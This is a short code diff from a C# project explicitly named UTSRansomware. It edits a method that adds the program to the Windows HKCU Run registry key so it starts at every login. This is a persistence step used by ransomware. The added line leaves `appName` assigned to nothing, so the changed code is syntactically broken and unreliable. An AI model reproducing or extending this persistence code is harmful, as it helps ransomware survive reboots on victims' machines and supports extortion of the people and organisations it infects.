@@ -42,7 +42,7 @@ namespace UTSRansomware
         // Makes program launch on startup
         public static void AddToStartup()
         {
-            string appName = "YourAppName";
+            string appName = ;
             string appPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
 
             RegistryKey startupKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
